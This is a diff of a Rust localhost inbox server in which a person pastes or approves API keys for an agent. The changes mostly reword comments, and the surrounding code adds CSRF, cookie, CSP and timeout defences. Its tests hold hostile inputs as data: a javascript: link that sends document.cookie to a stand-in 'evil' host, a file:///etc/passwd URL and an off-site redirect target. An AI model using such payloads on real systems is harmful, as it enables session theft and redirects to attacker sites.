@@ -1,7 +1,7 @@
 //! Localhost inbox: the human surface. One click from the notification to the vendor's page,
 //! paste, submit. Binds 127.0.0.1 only. Exits after 30 idle minutes with no open tasks.
 //!
-//! Loopback is not authentication — see `crate::inbox_auth` for the threat model. Every route
+//! Loopback is not authentication. See `crate::inbox_auth` for the threat model. Every route
 //! except `/verify` requires a credential: the browser session (full scope) or one card's
 //! capability (that card only), presented as `?t=` on the first visit, then held as an
 //! `HttpOnly; SameSite=Strict` cookie. POSTs additionally carry it in a hidden form field
@@ -12,8 +12,8 @@
 //! Requests are handled one after another on the main thread, which is what the database and
 //! the stash want. That makes "a client that never finishes its request" the thing to design
 //! against: any process on the machine, or a page in the browser, can open a POST, send the
-//! headers and then nothing. If the handler waited for that body, every later request — a
-//! human's paste, the CLI's `/verify` ownership probe — would wait behind it for as long as
+//! headers and then nothing. If the handler waited for that body, every later request, such as a
+//! human's paste or the CLI's `/verify` ownership probe, would wait behind it for as long as
 //! the socket stayed open.
 //!
 //! So the main thread never reads from a socket. A fixed pool of [`READERS`] threads takes
@@ -25,7 +25,7 @@
 //! per wait is cut off by the whole-request deadline all the same. Only a complete request
 //! reaches [`handle`], so a truncated form can neither authenticate with the CSRF field at its
 //! front nor hand a half-copied key to `answer_secret`. Writing is bounded the same way: a
-//! whole response — status line, headers and body, error replies included — must be taken
+//! whole response, error replies included, must have its status line, headers and body taken
 //! within [`RESPONSE_DEADLINE`], and every partial write is given only the time that is left,
 //! so the main thread spends at most that long on any one client however slowly it reads.
 //! A request over the tailnet from another device also needs `tailscale whois` to say who sent
@@ -40,7 +40,7 @@
 //!
 //! The server is a small HTTP/1.1 listener over `std::net`, not a framework: a framework that
 //! owns the socket offers no way to put a deadline on it (and `tiny_http`, used before, drains
-//! the declared body on whichever thread drops a request — the very stall being closed). One
+//! the declared body on whichever thread drops a request, which is the very stall being closed). One
 //! request per connection, `Connection: close` on every response: a form page on loopback
 //! needs nothing more, and keep-alive would be one more way to hold a reader.
 
@@ -77,10 +77,10 @@ const MAX_BODY: u64 = 64 * 1024;
 const MAX_HEAD: usize = 16 * 1024;
 /// Cap on the number of header lines.
 const MAX_HEADERS: usize = 100;
-/// A request — request line, headers and body — must have arrived in full this long after
+/// A request's request line, headers and body must have arrived in full this long after
 /// a reader took its connection. On loopback a browser delivers a form post in one write.
 const REQUEST_DEADLINE: Duration = Duration::from_secs(10);
-/// A response — status line, headers and body — must have been taken in full this long after
+/// A response's status line, headers and body must have been taken in full this long after
 /// the handler started writing it. The most the main thread spends on any one client.
 const RESPONSE_DEADLINE: Duration = Duration::from_secs(10);
 /// No single wait for bytes from a client, or for a client to take a response, lasts longer.
@@ -160,7 +160,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
     // CLI that has not yet decided to trust this listener asks "are you the tokenstash inbox
     // for my TOKENSTASH_HOME?" without handing over a credential to find out. We answer a
     // fresh nonce with HMAC(proof key, nonce); a process squatting the port cannot, and
-    // neither can anyone holding a session or card link captured from a URL — the proof key
+    // neither can anyone holding a session or card link captured from a URL, because the proof key
     // never travels.
     // On loopback, and on the tailnet from this machine itself: the CLI proves the listener
     // there is ours before it hands out tailnet links. Another device is owed nothing.
@@ -233,7 +233,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
         let presented = cookie(&req, route.cookie_name());
         // What the cookie proves, on this route: a session is Full; a capability is Task(id)
         // only when it names the card this path names, verified against that card's row
-        // (fetched by exact id — never a prefix, so nothing resolves an id the caller half knows).
+        // (fetched by exact id and never by a prefix, so nothing resolves an id the caller half knows).
         let scope = presented.as_deref().and_then(|c| tokens.scope_of(c, lookup)).filter(|s| route.admits(s));
         (presented, scope)
     };
@@ -251,7 +251,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
     let form = if method == "POST" { parse_form(&String::from_utf8_lossy(&req.body)) } else { HashMap::new() };
 
     // GET: the cookie alone (SameSite=Strict stops a foreign page from making the browser
-    // send it). POST: the cookie AND a matching hidden field — double submit, so even a
+    // send it). POST: the cookie AND a matching hidden field. That is double submit, so even a
     // bypassed or unsupported SameSite cannot turn a cross-site form post into an answer.
     let authed = match method.as_str() {
         "POST" => cookie_ok && matches!((form.get("t"), presented.as_deref()), (Some(t), Some(c)) if inbox_auth::ct_eq(t, c)),
@@ -261,14 +261,14 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
     // that card's scoped route), the notification or `tokenstash open` (the session, on a
     // full route). Swap it for the route's cookie and bounce to a clean path so the
     // credential stops appearing in the address bar, history, and Referer. A credential
-    // that does not fit the route it was presented on — a capability for another card, a
-    // session from before the inbox last restarted, a link minted by an older version — gets
+    // that does not fit the route it was presented on, such as a capability for another card, a
+    // session from before the inbox last restarted, or a link minted by an older version, gets
     // the recovery page whatever cookies the browser holds: an explicit credential that
     // fails is refused, never papered over by a login in another tab. And a full session
     // already held is left exactly as it is: a card link never replaces it.
     if method == "GET" {
         if let Some(t) = q.get("t") {
-            // The credential is dropped by its DECODED name — `t=`, `%74=`, repeated — so no
+            // The credential is dropped by its DECODED name, whether `t=`, `%74=` or repeated, so no
             // spelling parse_form reads as `t` survives into the Location header; the rest
             // of the query goes back exactly as it came, nothing re-encoded.
             let rest = strip_auth_params(&query);
@@ -350,7 +350,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
                     if v.is_empty() { anyhow::bail!("empty value"); }
                     let skip = form.contains_key("skip_check");
                     // A paste other directories will receive (a Replace card; a key they
-                    // hold a grant for) is a decision about them — the agent's link may not
+                    // hold a grant for) is a decision about them, so the agent's link may not
                     // make it. `answer_secret_by` refuses that for a Requester under the
                     // index lock, before anything is stored.
                     match tasks::answer_secret_by(&ctx, actor, &task, SecretString::from(v), skip)? {
@@ -358,7 +358,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
                             let mut m = format!("Stored {} and wrote it to {}", task.name.clone().unwrap_or_default(), injected_to.map(|p| p.display().to_string()).unwrap_or_else(|| "the stash".into()));
                             if let Some(r) = rotation {
                                 if !r.rewritten.is_empty() { m.push_str(&format!("; also updated {} other project(s)", r.rewritten.len())); }
-                                if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}) — fix before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
+                                if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}), so fix those before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
                             }
                             Ok(m)
                         }
@@ -388,7 +388,7 @@ fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
                     // person scripting `curl`) is judged on the card as it is now.
                     let seen: Option<Vec<String>> = form.get("seen").map(|s| s.split(',').filter(|x| !x.is_empty()).map(String::from).collect());
                     match tasks::answer_approval(&ctx, &task, decision, seen.as_deref())? {
-                        AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery — a Replace card is waiting", replaced.join(", ")) })),
+                        AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery. A Replace card is waiting", replaced.join(", ")) })),
                         _ => Ok(format!("Denied {}", task.title)),
                     }
                 }
@@ -484,8 +484,8 @@ impl Route {
     }
 }
 
-/// The id a `<prefix><id>` path names, trailing slash tolerated. What it means — a prefix a
-/// person typed, or the one exact card a link opens — is the route's business.
+/// The id a `<prefix><id>` path names, trailing slash tolerated. What it means, whether a prefix a
+/// person typed or the one exact card a link opens, is the route's business.
 fn path_task_id<'a>(path: &'a str, prefix: &str) -> Option<&'a str> {
     let id = path.strip_prefix(prefix)?.trim_end_matches('/');
     (!id.is_empty() && !id.contains('/')).then_some(id)
@@ -541,7 +541,7 @@ fn respond(req: Request, code: u16, ctype: &str, body: String) -> Result<()> {
         .with("X-Frame-Options", "DENY")
         // The pages are self-contained: one inline <style>, no script, no image, no fetch.
         // Saying so stops a link or a field that got past the escaping upstream from
-        // running anything in this origin — the origin whose session approves grants.
+        // running anything in this origin, the origin whose session approves grants.
         .with("Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'")
         .with("Referrer-Policy", "no-referrer"))
 }
@@ -559,7 +559,7 @@ fn page_stale_link(req: Request) -> Result<()> {
 /// 303 that also installs a cookie: the session at `Path=/`, or one card's capability at
 /// `Path=/p/<id>` so the browser presents it to that card's route alone. No `Secure`
 /// attribute: this is plain HTTP on the loopback interface and `Secure` would make the
-/// browser drop the cookie outright. No `Max-Age` either — it dies with the browser session.
+/// browser drop the cookie outright. No `Max-Age` either, so it dies with the browser session.
 fn redirect_authed(req: Request, to: &str, name: &str, cookie_path: &str, token: &str) -> Result<()> {
     let set_cookie = format!("{name}={token}; Path={cookie_path}; HttpOnly; SameSite=Strict");
     req.respond(Reply::new(303, String::new()).with("Location", local(to)).with("Set-Cookie", set_cookie).with("Cache-Control", "no-store"))
@@ -581,8 +581,8 @@ fn same_origin_path(p: &str) -> bool {
     p.starts_with('/') && !p.starts_with("//") && !p.contains('\\')
 }
 
-/// The query without any parameter whose decoded name is `t` — the session credential in any
-/// spelling parse_form would accept, every occurrence — the remaining pairs verbatim.
+/// The query without any parameter whose decoded name is `t`, the session credential in any
+/// spelling parse_form would accept, removing every occurrence and keeping the remaining pairs verbatim.
 fn strip_auth_params(query: &str) -> String {
     query.split('&')
         .filter(|kv| !kv.is_empty() && form_decode(kv.split('=').next().unwrap_or_default()) != "t")
@@ -662,7 +662,7 @@ impl Drop for Request {
     }
 }
 
-/// Writes `reply` whole — status line, headers and body — before `deadline`, or fails.
+/// Writes `reply`'s status line, headers and body in full before `deadline`, or fails.
 fn write_reply(stream: &mut TcpStream, reply: &Reply, head_only: bool, deadline: Instant) -> std::io::Result<()> {
     let mut out = format!("HTTP/1.1 {} {}\r\n", reply.code, reason(reply.code));
     for (name, value) in &reply.headers {
@@ -1086,7 +1086,7 @@ fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scop
         TaskKind::Secret => {
             b.push_str(&resend);
             b.push_str(&format!(
-                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown to the agent'>{}<div class=mut style='margin-top:8px'>What happens to it: {} then it is stored in your keychain and written to <code>{}</code> in the requesting directory{}. The agent reads that file; it never sees the value in chat.</div><label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
+                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here, never shown to the agent'>{}<div class=mut style='margin-top:8px'>What happens to it: {} then it is stored in your keychain and written to <code>{}</code> in the requesting directory{}. The agent reads that file; it never sees the value in chat.</div><label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
                 esc(&t.name.clone().unwrap_or_default()),
                 t.pattern.as_ref().map(|p| format!("<div class=mut>must match <code>{}</code></div>", esc(p))).unwrap_or_default(),
                 if tokenstash_core::registry::lookup(t.name.as_deref().unwrap_or_default()).and_then(|p| p.check.as_ref()).is_some() { "one authenticated request goes to the provider to confirm the key works (unless you skip the check)," } else { "no provider check exists for this name, so it is stored as pasted;" },
@@ -1098,7 +1098,7 @@ fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scop
             // The human is approving a delivery, so the card must show everything that
             // decision covers: the canonical path, what kind of decision this is, the
             // exact destination file, and every key with its identity and sensitivity.
-            let kind = match t.expects.as_str() { tasks::APPROVAL_PAIRING => "new directory — first stored keys", tasks::APPROVAL_SENSITIVE => "sensitive / unregistered keys — each its own decision", tasks::APPROVAL_ONCE => "chosen by a running program — this run only", _ => "approval" };
+            let kind = match t.expects.as_str() { tasks::APPROVAL_PAIRING => "new directory, first stored keys", tasks::APPROVAL_SENSITIVE => "sensitive / unregistered keys, each its own decision", tasks::APPROVAL_ONCE => "chosen by a running program, for this run only", _ => "approval" };
             b.push_str(&format!("<p class=mut>Directory: <code>{}</code><br>Decision: {}<br>Written to: <code>{}</code></p>", esc(&t.project), esc(kind), esc(&std::path::Path::new(&t.project).join(env_file).display().to_string())));
             let rows: Vec<String> = t.names.iter().filter(|n| n.as_str() != "*").map(|entry| {
                 let (n, identity) = tasks::split_identity(entry);
@@ -1135,7 +1135,7 @@ fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scop
             // Said before the field, not after: both the answer and the reason for declining
             // go back to the agent word for word, and the agent's context is not a place for
             // anything private.
-            b.push_str("<div class=err>Whatever you type below is returned to the agent word for word — as your answer if you press Done, as the reason if you press Can't do this. Do not put a password, a key, or anything private in it; the agent should request secrets with <code>tokenstash need</code>.</div>");
+            b.push_str("<div class=err>Whatever you type below is returned to the agent word for word, as your answer if you press Done or as the reason if you press Can't do this. Do not put a password, a key, or anything private in it; the agent should request secrets with <code>tokenstash need</code>.</div>");
             let note = if t.expects == "text" {
                 "<textarea name=note rows=3 placeholder='your answer (sent to the agent)'></textarea>"
             } else {
@@ -1193,7 +1193,7 @@ mod tests {
     }
 
     /// The card's link is the one thing on the page the human clicks. A `javascript:` URL
-    /// there would run in the inbox's own origin — the origin whose session approves grants.
+    /// there would run in the inbox's own origin, the origin whose session approves grants.
     #[test]
     fn a_card_link_is_rendered_only_for_http_schemes() {
         for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
@@ -1232,7 +1232,7 @@ mod tests {
     }
 
     /// The session opens the full routes and nothing scoped; a capability opens its own
-    /// card's scoped route and nothing else — not the full route for the same card, not a
+    /// card's scoped route and nothing else, not the full route for the same card, not a
     /// sibling's scoped route.
     #[test]
     fn each_route_admits_exactly_its_own_kind_of_credential() {
@@ -1472,7 +1472,7 @@ mod tests {
     }
 
     /// The `?t=` login redirect drops the credential in every spelling parse_form would accept,
-    /// re-emits nothing, and never points off this origin — the request target was refused for
+    /// re-emits nothing, and never points off this origin. The request target was refused for
     /// that at the door, and the redirect helpers refuse it again.
     #[test]
     fn the_login_redirect_drops_the_credential_in_any_spelling_and_stays_on_this_origin() {
@@ -1492,7 +1492,7 @@ mod tests {
             assert_eq!(local(ok), ok);
         }
         // On the wire: a foreign target becomes `/`, a same-origin one is kept, and the cookie
-        // is set where the route asked — the session at `/`, a card capability at its card.
+        // is set where the route asked, the session at `/` and a card capability at its card.
         for (to, location, name, cookie_path) in [
             ("//evil.example/", "/", inbox_auth::COOKIE, "/"),
             ("/t/abc?m=x", "/t/abc?m=x", inbox_auth::COOKIE, "/"),
